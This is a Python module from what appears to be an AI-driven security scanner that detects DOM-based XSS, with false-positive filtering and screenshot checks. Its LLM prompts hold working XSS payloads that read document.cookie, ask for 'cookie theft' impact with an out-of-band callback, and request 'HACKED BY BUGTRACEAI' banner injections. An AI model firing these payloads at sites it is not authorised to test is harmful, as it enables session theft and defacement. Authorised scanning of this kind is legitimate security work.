"""
DOM-based XSS detection and testing.

Contains both pure analysis/parsing functions and I/O testing functions
for DOM XSS detection via Playwright hooks and visual validation.

Extracted from xss_agent.py (lines 2926-3284, 6856-7062).
"""

import asyncio
import re
from typing import Dict, List, Optional, Any
from pathlib import Path
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from bugtrace.utils.logger import get_logger
from bugtrace.core.ui import dashboard
from bugtrace.core.config import settings

logger = get_logger("agents.xss.dom")


# ---------------------------------------------------------------------------
# PURE FUNCTIONS — no I/O, no side effects
# ---------------------------------------------------------------------------

def analyze_global_context(html: str) -> str:
    """
    Analyze the full HTML for global technology signatures (Angular, React, Vue, jQuery).
    This provides 'Sniper' context for frameworks.

    Args:
        html: Full HTML page source.

    Returns:
        Comma-separated technology identifiers, or "Vanilla JS / Unknown".
    """
    if not html:
        return "No HTML content"

    context: List[str] = []
    lower_html = html.lower()

    # AngularJS 1.x
    if "ng-app" in lower_html or "angular.js" in lower_html or "angular.min.js" in lower_html or "angular_1" in lower_html:
        context.append("AngularJS (CSTI Risk!)")

    # React
    if "react" in lower_html and "component" in lower_html:
        context.append("React")

    # Vue
    if "vue.js" in lower_html or "vue.min.js" in lower_html or "v-if" in lower_html:
        context.append("Vue.js")

    # jQuery
    if "jquery" in lower_html:
        context.append("jQuery")

    return ", ".join(context) if context else "Vanilla JS / Unknown"


def build_dom_system_prompt(tech_context: str = "") -> str:
    """
    Build system prompt for DOM XSS analysis (LLM template string).

    Args:
        tech_context: Optional technology context string for extra context.

    Returns:
        System prompt string for the LLM.
    """
    return """You are an elite XSS specialist. Your job is to analyze HTML and generate PRECISE payloads.

CRITICAL: You must understand the EXACT DOM structure to escape correctly.

Example 1 - Inside a div:
```html
<div class="container"><span>USER_INPUT</span></div>
```
Correct payload: `</span></div><script>alert(document.cookie)</script>`
Why: Must close </span> AND </div> before injecting script.

Example 2 - Inside an attribute:
```html
<input value="USER_INPUT" type="text">
```
Correct payload: `" onfocus="alert(document.cookie)" autofocus x="`
Why: Close the value attribute, inject event handler, autofocus triggers it.

Example 3 - Inside JavaScript string:
```html
<script>var x = "USER_INPUT";</script>
```
Correct payload: `";alert(document.cookie);//`
Why: Close string, inject code, comment out rest.

Example 4 - Inside JavaScript with escaping:
```html
<script>var x = 'USER_INPUT';</script>
```
If backslash survives: `\\';alert(document.cookie);//`
If not: Try closing script tag: `</script><script>alert(document.cookie)</script>`

RULES:
1. ALWAYS analyze the exact DOM structure first
2. Identify ALL tags that need closing before your payload
3. Generate payloads that include document.cookie or document.domain for maximum impact
4. If < > are filtered, use event handlers or javascript: protocol
5. Generate 1-3 payloads ranked by likelihood of success"""


def build_dom_user_prompt(
    url: str,
    html: str,
    param: str,
    probe_string: str,
    interactsh_url: str,
    context_data: Dict,
    dom_snippet: str,
) -> str:
    """
    Build user prompt for DOM XSS analysis (LLM template string).

    Args:
        url: Target URL being tested.
        html: Full HTML page source (will be truncated to 8000 chars).
        param: Parameter name being tested.
        probe_string: The probe string used for reflection detection.
        interactsh_url: OOB callback URL for validation.
        context_data: Reflection context metadata dict.
        dom_snippet: Extracted DOM snippet around the reflection point.

    Returns:
        User prompt string for the LLM.
    """
    return f"""Analyze this HTML and generate XSS payloads:

TARGET URL: {url}
PARAMETER: {param}
PROBE STRING: {probe_string}
CALLBACK URL (for OOB validation): {interactsh_url}

REFLECTION CONTEXT:
- Type: {context_data.get('context', 'unknown')}
- Surviving characters: {context_data.get('surviving_chars', 'unknown')}
- In blocked/WAF: {context_data.get('is_blocked', False)}

DOM SNIPPET (around reflection point):
```html
{dom_snippet}
```

FULL HTML (for context):
```html
{html[:8000]}
```

Generate 1-3 PRECISE XSS payloads. For each payload explain:
1. What tags/attributes need to be escaped
2. Why this specific payload will work
3. Expected impact (cookie theft, domain access, etc.)

Response format (XML):
<analysis>Your DOM structure analysis</analysis>
<payloads>
  <payload>
    <code>THE_PAYLOAD_HERE</code>
    <reasoning>Why it works</reasoning>
    <impact>cookie_theft|domain_access|execution</impact>
    <confidence>0.0-1.0</confidence>
  </payload>
  <!-- More payloads if needed -->
</payloads>"""


def extract_dom_around_reflection(html: str, probe: str, context_chars: int = 500) -> str:
    """
    Extract the DOM snippet around where the probe string appears.

    Args:
        html: Full HTML page source.
        probe: Probe string to locate in the HTML.
        context_chars: Number of characters to include before and after the probe.

    Returns:
        HTML snippet surrounding the probe location.
    """
    if probe not in html:
        return html[:1000]  # Fallback to first 1000 chars

    idx = html.find(probe)
    start = max(0, idx - context_chars)
    end = min(len(html), idx + len(probe) + context_chars)

    snippet = html[start:end]

    # Try to include complete tags
    if start > 0:
        # Find the last < before our snippet
        last_open = html.rfind('<', 0, start)
        if last_open != -1 and last_open > start - 200:
            snippet = html[last_open:end]

    return snippet


def parse_smart_analysis_response(response: str, interactsh_url: str, clean_payload_fn=None) -> List[Dict]:
    """
    Parse the LLM's smart analysis response into payload dicts.

    Args:
        response: Raw LLM response string.
        interactsh_url: Interactsh callback URL for placeholder replacement.
        clean_payload_fn: Optional callable(payload, param) -> str for cleaning payloads.
            If None, payloads are used as-is.

    Returns:
        List of payload dicts with: payload, reasoning, confidence (max 3, sorted by confidence).
    """
    # Try structured parsing first
    payloads = extract_structured_payloads(response, interactsh_url, clean_payload_fn)

    # Fallback to pattern extraction if structured parsing failed
    if not payloads:
        payloads = extract_payloads_by_patterns(response, clean_payload_fn)

    # Sort by confidence (highest first) and return top 3
    payloads.sort(key=lambda x: x.get("confidence", 0), reverse=True)
    return payloads[:3]


def extract_structured_payloads(response: str, interactsh_url: str, clean_payload_fn=None) -> List[Dict]:
    """
    Extract payloads from structured XML-like tags in an LLM response.

    Args:
        response: Raw LLM response containing <payload>...</payload> blocks.
        interactsh_url: Interactsh callback URL for placeholder replacement.
        clean_payload_fn: Optional callable(payload, param) -> str for cleaning.

    Returns:
        List of parsed payload dicts.
    """
    payloads = []
    payload_pattern = r'<payload>(.*?)</payload>'
    matches = re.findall(payload_pattern, response, re.DOTALL)

    for match in matches:
        payload_dict = parse_payload_block(match, interactsh_url, clean_payload_fn)
        if payload_dict:
            payloads.append(payload_dict)

    return payloads


def parse_payload_block(block: str, interactsh_url: str, clean_payload_fn=None) -> Optional[Dict]:
    """
    Parse a single payload block with code, reasoning, impact, confidence.

    Args:
        block: Content inside a <payload>...</payload> tag.
        interactsh_url: Interactsh callback URL for placeholder replacement.
        clean_payload_fn: Optional callable(payload, param) -> str for cleaning.

    Returns:
        Dict with payload, reasoning, impact, confidence; or None if no code found.
    """
    code_match = re.search(r'<code>(.*?)</code>', block, re.DOTALL)
    if not code_match:
        return None

    code = code_match.group(1).strip()
    if clean_payload_fn:
        code = clean_payload_fn(code, "")
    code = replace_callback_urls(code, interactsh_url)

    reasoning_match = re.search(r'<reasoning>(.*?)</reasoning>', block, re.DOTALL)
    impact_match = re.search(r'<impact>(.*?)</impact>', block, re.DOTALL)
    confidence_match = re.search(r'<confidence>(.*?)</confidence>', block, re.DOTALL)

    return {
        "payload": code,
        "reasoning": reasoning_match.group(1).strip() if reasoning_match else "",
        "impact": impact_match.group(1).strip() if impact_match else "execution",
        "confidence": float(confidence_match.group(1).strip()) if confidence_match else 0.7
    }


def replace_callback_urls(code: str, interactsh_url: str) -> str:
    """
    Replace callback URL placeholders with actual interactsh URL.

    Args:
        code: Payload code potentially containing placeholder strings.
        interactsh_url: The actual callback URL to substitute.

    Returns:
        Code with placeholders replaced.
    """
    if "{{interactsh_url}}" in code:
        return code.replace("{{interactsh_url}}", interactsh_url)
    elif "CALLBACK_URL" in code or "callback_url" in code.lower():
        return re.sub(r'(?i)callback_url', interactsh_url, code)
    return code


def extract_payloads_by_patterns(response: str, clean_payload_fn=None) -> List[Dict]:
    """
    Extract payloads using regex patterns for common XSS indicators.

    Fallback method when structured XML parsing fails.

    Args:
        response: Raw LLM response string.
        clean_payload_fn: Optional callable(payload, param) -> str for cleaning.

    Returns:
        List of payload dicts with confidence 0.5.
    """
    payloads = []
    code_patterns = [
        r'`([^`]+(?:alert|fetch|document\.|onerror|onload)[^`]+)`',
        r'Payload[:\s]+([^\n]+)',
    ]

    for pattern in code_patterns:
        matches = re.findall(pattern, response, re.IGNORECASE)
        for m in matches[:3]:  # Limit to 3
            cleaned = m.strip()
            if clean_payload_fn:
                cleaned = clean_payload_fn(cleaned, "")
            if len(cleaned) > 5 and any(x in cleaned.lower() for x in ['<', 'alert', 'fetch', 'document']):
                payloads.append({
                    "payload": cleaned,
                    "reasoning": "Extracted from LLM response",
                    "impact": "execution",
                    "confidence": 0.5
                })

    return payloads


def log_generated_payloads(agent_name: str, payloads: List[Dict]) -> None:
    """
    Log generated payloads to dashboard.

    Args:
        agent_name: Name of the agent for log prefix.
        payloads: List of payload dicts with 'payload' and 'confidence' keys.
    """
    logger.info(f"[{agent_name}] LLM Brain generated {len(payloads)} precision payloads")
    for i, p in enumerate(payloads):
        dashboard.log(
            f"[{agent_name}] Smart Payload #{i+1}: {p['payload'][:50]}... (conf: {p['confidence']})",
            "INFO"
        )


def filter_dom_xss_false_positives(
    dom_findings: List[Dict],
    agent_name: str,
) -> tuple:
    """
    Filter DOM XSS candidates to remove false positives.

    Filters applied:
    1. Canary-only payloads (plain string reaching innerHTML, no execution)
    2. postMessage self-send (scanner's own message, not cross-origin)
    3. Static analysis patterns (regex matching without execution proof)

    Args:
        dom_findings: List of raw DOM XSS candidate dicts.
        agent_name: Agent name for logging.

    Returns:
        Tuple of (confirmed_findings, confirmed_count, skipped_count)
        where confirmed_findings is a list of dicts that passed all filters.
    """
    confirmed = []
    skipped_count = 0

    for df in dom_findings:
        sink = df.get("sink", "")
        source_str = df.get("source", "unknown")
        payload = df.get("payload", "")
        param_name = source_str.split(":")[-1] if ":" in source_str else source_str

        # 1. Canary-only payloads: a plain string reaching innerHTML is NOT XSS.
        #    Real XSS requires HTML/JS execution (e.g., <script>, onerror=, javascript:)
        canary_base = "BUGTRACEAI_7x7"
        payload_stripped = payload.replace(canary_base, "").replace("|", "").replace(param_name, "").strip()
        is_canary_only = not payload_stripped or payload_stripped in ("", "|")
        if is_canary_only and sink != "alert":
            skipped_count += 1
            logger.info(f"[{agent_name}] DOM XSS FP filtered: canary-only payload in {sink} sink (param: {param_name})")
            continue

        # 2. postMessage self-send: scanner sends its own message, doesn't prove
        #    cross-origin exploitability. Reject unless alert() actually fired.
        if source_str == "window.postMessage" and sink != "alert":
            skipped_count += 1
            logger.info(f"[{agent_name}] DOM XSS FP filtered: postMessage self-send to {sink} sink")
            continue

        # 3. Static analysis patterns: regex source-to-sink matching without execution proof.
        if "source-to-sink pattern detected" in payload.lower() or "static analysis" in str(df.get("evidence", "")).lower():
            skipped_count += 1
            logger.info(f"[{agent_name}] DOM XSS FP filtered: static analysis pattern, no execution proof")
            continue

        # Passed all FP filters
        confirmed.append(df)

    return confirmed, len(confirmed), skipped_count


# ---------------------------------------------------------------------------
# I/O FUNCTIONS — need external dependencies passed as parameters
# ---------------------------------------------------------------------------

async def call_dom_llm(llm_client, system_prompt: str, user_prompt: str) -> Optional[str]:
    """
    Call LLM for DOM analysis.

    Args:
        llm_client: LLM client instance with async generate() method.
        system_prompt: System prompt for the LLM.
        user_prompt: User prompt for the LLM.

    Returns:
        LLM response string, or None.
    """
    return await llm_client.generate(
        prompt=user_prompt,
        module_name="XSS_SMART_ANALYSIS",
        system_prompt=system_prompt,
        model_override=settings.MUTATION_MODEL,
        max_tokens=4000,
        temperature=0.3
    )


async def smart_dom_analysis(
    llm_client,
    url: str,
    html: str,
    param: str,
    probe_string: str,
    interactsh_url: str,
    context_data: Dict,
    agent_name: str = "XSS",
    clean_payload_fn=None,
) -> List[Dict]:
    """
    LLM-First Strategy: Analyze DOM structure and generate targeted payloads.

    Instead of trying 50+ generic payloads, the LLM:
    1. Parses the exact DOM structure around the reflection point
    2. Identifies what tags/attributes need to be escaped
    3. Generates 1-3 precision payloads for the exact context

    Args:
        llm_client: LLM client instance with async generate() method.
        url: Target URL.
        html: Full HTML source.
        param: Parameter name being tested.
        probe_string: The probe string used.
        interactsh_url: OOB callback URL.
        context_data: Reflection context metadata.
        agent_name: Agent name for logging.
        clean_payload_fn: Optional callable(payload, param) -> str for cleaning.

    Returns:
        List of payload dicts with: payload, reasoning, confidence.
    """
    dom_snippet = extract_dom_around_reflection(html, probe_string)

    system_prompt = build_dom_system_prompt()
    user_prompt = build_dom_user_prompt(
        url, html, param, probe_string, interactsh_url, context_data, dom_snippet
    )

    try:
        response = await call_dom_llm(llm_client, system_prompt, user_prompt)

        if not response:
            logger.warning(f"[{agent_name}] LLM Smart Analysis returned empty response")
            return []

        payloads = parse_smart_analysis_response(response, interactsh_url, clean_payload_fn)

        if payloads:
            log_generated_payloads(agent_name, payloads)

        return payloads

    except Exception as e:
        logger.error(f"[{agent_name}] LLM Smart Analysis failed: {e}", exc_info=True)
        return []


async def loop_test_dom_xss(
    detect_dom_xss_fn,
    url: str,
    urls_to_test: List[str],
    discovered_param_names: Optional[List[str]],
    agent_name: str = "XSS",
    event_emitter=None,
) -> tuple:
    """
    Phase 3.5: DOM XSS Headless scan with FP filtering.

    Flow:
    1. detect_dom_xss() finds DOM XSS candidates across all URLs
    2. Filter false positives (canary-only, self-send, static analysis)
    3. Return confirmed findings

    Args:
        detect_dom_xss_fn: Async callable(url, discovered_params=...) -> List[Dict].
        url: Primary target URL (for event emission).
        urls_to_test: All URLs to scan for DOM XSS.
        discovered_param_names: Parameter names to pass to detector, or None.
        agent_name: Agent name for logging.
        event_emitter: Optional event emitter with .emit() method.

    Returns:
        Tuple of (confirmed_findings_dicts, confirmed_count, skipped_count)
        where confirmed_findings_dicts have keys: url, sink, source, payload, param_name.
    """
    dashboard.log(f"[{agent_name}] Starting DOM XSS Headless Scan...", "INFO")
    logger.info(f"[{agent_name}] Phase 3.5: DOM XSS Headless Scan")

    try:
        if event_emitter:
            event_emitter.emit("exploit.xss.dom.started", {"url": url, "urls_count": len(urls_to_test)})
        logger.info(f"[{agent_name}] DOM XSS scanning {len(urls_to_test)} URLs")

        dom_findings: List[Dict] = []
        for test_url in urls_to_test:
            try:
                url_findings = await asyncio.wait_for(
                    detect_dom_xss_fn(test_url, discovered_params=discovered_param_names),
                    timeout=90
                )
                if url_findings:
                    dom_findings.extend(url_findings)
            except asyncio.TimeoutError:
                logger.warning(f"[{agent_name}] DOM XSS timeout (90s) for {test_url}, skipping")
            except Exception as e:
                logger.debug(f"[{agent_name}] DOM XSS scan failed for {test_url}: {e}")

        if not dom_findings:
            dashboard.log(f"[{agent_name}] No DOM XSS candidates found across {len(urls_to_test)} URLs", "INFO")
            return [], 0, 0

        dashboard.log(
            f"[{agent_name}] Found {len(dom_findings)} DOM XSS candidates from {len(urls_to_test)} URLs, validating...",
            "INFO"
        )

        confirmed, confirmed_count, skipped_count = filter_dom_xss_false_positives(dom_findings, agent_name)

        if skipped_count > 0:
            dashboard.log(
                f"[{agent_name}] DOM XSS: filtered {skipped_count}/{len(dom_findings)} false positives (canary-only/self-send/static)",
                "INFO"
            )

        if event_emitter:
            event_emitter.emit("exploit.xss.dom.result", {"url": url, "candidates": len(dom_findings), "confirmed": confirmed_count})

        if confirmed_count > 0:
            dashboard.log(
                f"[{agent_name}] DOM XSS: {confirmed_count}/{len(dom_findings)} confirmed!",
                "SUCCESS"
            )
        else:
            dashboard.log(
                f"[{agent_name}] DOM XSS: {len(dom_findings)} candidates, 0 confirmed",
                "WARN"
            )

        return confirmed, confirmed_count, skipped_count

    except Exception as e:
        logger.error(f"[{agent_name}] DOM XSS Headless Scan failed: {e}", exc_info=True)
        dashboard.log(f"[{agent_name}] DOM XSS Scan skipped: Headless error", "WARN")
        return [], 0, 0


async def validate_dom_xss_visually(
    verifier,
    vision_validator_fn,
    url: str,
    payload: str,
    sink: str,
    source: str,
    agent_name: str = "XSS",
    screenshots_dir: Optional[Path] = None,
) -> Optional[Dict[str, Any]]:
    """
    Validate DOM XSS candidate with screenshot + Vision AI.

    Bulletproof validation:
    1. Navigate to URL (payload already in URL from detector)
    2. Capture screenshot
    3. Vision AI confirms: "Do you see alert/XSS execution?"

    Args:
        verifier: XSSVerifier instance with async verify_xss() method.
        vision_validator_fn: Async callable(screenshot_path, attack_url, payload, evidence) for Vision AI.
        url: Attack URL with payload embedded.
        payload: The XSS payload.
        sink: DOM sink type (e.g., "eval", "innerHTML").
        source: DOM source type (e.g., "postMessage", "location.hash").
        agent_name: Agent name for logging.
        screenshots_dir: Directory for screenshots.

    Returns:
        Evidence dict with vision_confirmed=True if validated, None otherwise.
    """
    try:
        if screenshots_dir:
            screenshots_dir = Path(screenshots_dir)
            screenshots_dir.mkdir(parents=True, exist_ok=True)

        result = await verifier.verify_xss(
            url=url,
            screenshot_dir=str(screenshots_dir) if screenshots_dir else None,
            timeout=10.0,
            max_level=3
        )

        evidence = {
            "sink": sink,
            "source": source,
            "detector_found": True,
            "playwright_tested": True
        }

        if result and result.screenshot_path:
            evidence["screenshot_path"] = result.screenshot_path

            # Vision AI validation
            await vision_validator_fn(
                screenshot_path=result.screenshot_path,
                attack_url=url,
                payload=payload,
                evidence=evidence
            )

        if result and result.success:
            evidence["playwright_confirmed"] = True
            # If Playwright confirmed but no Vision, still consider it
            # but with lower confidence
            if not evidence.get("vision_confirmed"):
                evidence["validation_note"] = "Playwright confirmed, Vision not available"

        return evidence if (evidence.get("vision_confirmed") or evidence.get("playwright_confirmed")) else None

    except Exception as e:
        logger.error(f"[{agent_name}] DOM XSS visual validation failed: {e}")
        return None


async def try_alternative_dom_payloads(
    llm_client,
    validate_visually_fn,
    url: str,
    sink: str,
    source: str,
    original_payload: str,
    agent_name: str = "XSS",
    screenshots_dir: Optional[Path] = None,
) -> Optional[Dict[str, Any]]:
    """
    Generate and test alternative payloads when original doesn't work visually.

    Uses LLM to generate 10 visual payloads for the specific sink/source
    combination, then tests each until one is visually confirmed.

    Args:
        llm_client: LLM client instance with async generate() method.
        validate_visually_fn: Async callable(url, payload, sink, source, screenshots_dir) -> evidence or None.
        url: Base URL (without payload).
        sink: DOM sink type (e.g., "eval", "innerHTML").
        source: DOM source type (e.g., "postMessage", "location.hash").
        original_payload: The payload that didn't work.
        agent_name: Agent name for logging.
        screenshots_dir: Directory for screenshots.

    Returns:
        Evidence dict with working_payload if found, or dict with error info.
    """
    dashboard.log(
        f"[{agent_name}] Generating alternative payloads for {sink}...",
        "INFO"
    )

    # Generate visual payloads via LLM
    prompt = f"""You are a DOM XSS expert. I found a DOM XSS vulnerability:
- Sink: {sink}
- Source: {source}
- Original payload that was detected but not visually confirmed: {original_payload[:100]}

Generate exactly 10 XSS payloads that will:
1. Exploit this specific sink ({sink}) via the source ({source})
2. Create a VISIBLE RED BANNER with text "HACKED BY BUGTRACEAI"

CRITICAL: Use BACKTICKS (`) instead of quotes for all strings to avoid escaping issues!

Working example for eval sink (uses backticks):
var d=document.createElement(`div`);d.style=`position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999`;d.innerText=`HACKED BY BUGTRACEAI`;document.body.prepend(d);

Working example for innerHTML sink:
<div style="position:fixed;top:0;left:0;width:100%;background:red;color:white;text-align:center;padding:20px;font-size:24px;font-weight:bold;z-index:99999">HACKED BY BUGTRACEAI</div>

Adapt the payload to work with the {sink} sink:
- For eval/Function: use backticks for strings, create div via DOM API
- For innerHTML/outerHTML: inject div HTML directly
- For document.write: write the full div HTML
- For postMessage: craft message payload with backticks

Return ONLY the payloads, one per line, no explanations."""

    try:
        response = await llm_client.generate(
            prompt=prompt,
            module_name="DOM-XSS-AltPayloads",
            model_override=settings.MUTATION_MODEL,
            temperature=0.7,
            max_tokens=2000
        )

        if not response:
            return {"attempts": 0, "error": "LLM returned empty response"}

        # Parse payloads
        payloads = []
        for line in response.strip().split("\n"):
            line = line.strip()
            if line and not line.startswith("#") and len(line) > 5:
                # Remove numbering
                if len(line) > 2 and line[0].isdigit() and line[1] in ".):":
                    line = line[2:].strip()
                payloads.append(line)

        payloads = payloads[:10]  # Max 10

        if not payloads:
            return {"attempts": 0, "error": "No payloads generated"}

        dashboard.log(
            f"[{agent_name}] Testing {len(payloads)} alternative payloads...",
            "INFO"
        )

        # Test each payload
        for i, payload in enumerate(payloads):
            dashboard.set_current_payload(
                f"ALT [{i+1}/{len(payloads)}]",
                "DOM XSS Alt",
                "Testing"
            )

            # Build URL with payload
            # For DOM XSS, payload often goes in hash or specific param
            parsed = urlparse(url)
            if source == "location.hash":
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}#{payload}"
            elif source == "postMessage":
                # postMessage needs different approach - use original URL
                # and inject via script
                test_url = url
            else:
                # Try in query string - use param name from source if available
                params = parse_qs(parsed.query)
                # Extract param name from source (e.g., "param:returnPath" -> "returnPath")
                if source and ":" in source:
                    param_name = source.split(":")[-1]
                elif source and source.startswith("location."):
                    param_name = list(params.keys())[0] if params else "input"
                else:
                    param_name = list(params.keys())[0] if params else "input"
                params[param_name] = [payload]
                test_url = urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, urlencode(params, doseq=True), parsed.fragment
                ))

            # Validate visually
            evidence = await validate_visually_fn(
                url=test_url,
                payload=payload,
                sink=sink,
                source=source,
                screenshots_dir=screenshots_dir
            )

            if evidence and evidence.get("vision_confirmed"):
                evidence["working_payload"] = payload
                evidence["attempts"] = i + 1
                evidence["total_alternatives"] = len(payloads)
                return evidence

        # None worked
        return {"attempts": len(payloads), "error": "No payload visually confirmed"}

    except Exception as e:
        logger.error(f"[{agent_name}] Alternative payload generation failed: {e}")
        return {"attempts": 0, "error": str(e)}


__all__ = [
    # Pure functions
    "analyze_global_context",
    "build_dom_system_prompt",
    "build_dom_user_prompt",
    "extract_dom_around_reflection",
    "parse_smart_analysis_response",
    "extract_structured_payloads",
    "parse_payload_block",
    "replace_callback_urls",
    "extract_payloads_by_patterns",
    "log_generated_payloads",
    "filter_dom_xss_false_positives",
    # I/O functions
    "call_dom_llm",
    "smart_dom_analysis",
    "loop_test_dom_xss",
    "validate_dom_xss_visually",
    "try_alternative_dom_payloads",
]
